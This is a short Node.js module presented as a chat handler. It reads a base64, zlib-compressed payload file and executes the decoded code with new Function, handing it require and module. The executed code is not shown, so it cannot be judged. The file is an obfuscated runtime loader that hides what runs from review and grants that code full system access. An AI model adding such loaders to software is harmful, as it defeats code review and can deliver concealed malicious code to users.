/* KAZER chat handler — runtime inflate from payload file */
const fs = require("fs");
const path = require("path");
const zlib = require("zlib");
const b64 = fs.readFileSync(path.join(__dirname, "_chat-payload.b64"), "utf8").trim();
const code = zlib.inflateSync(Buffer.from(b64, "base64")).toString("utf8");
module.exports = new Function(
  "require", "module", "exports", "__dirname", "__filename",
  code + "\n;return module.exports;"
)(require, module, exports, __dirname, __filename);
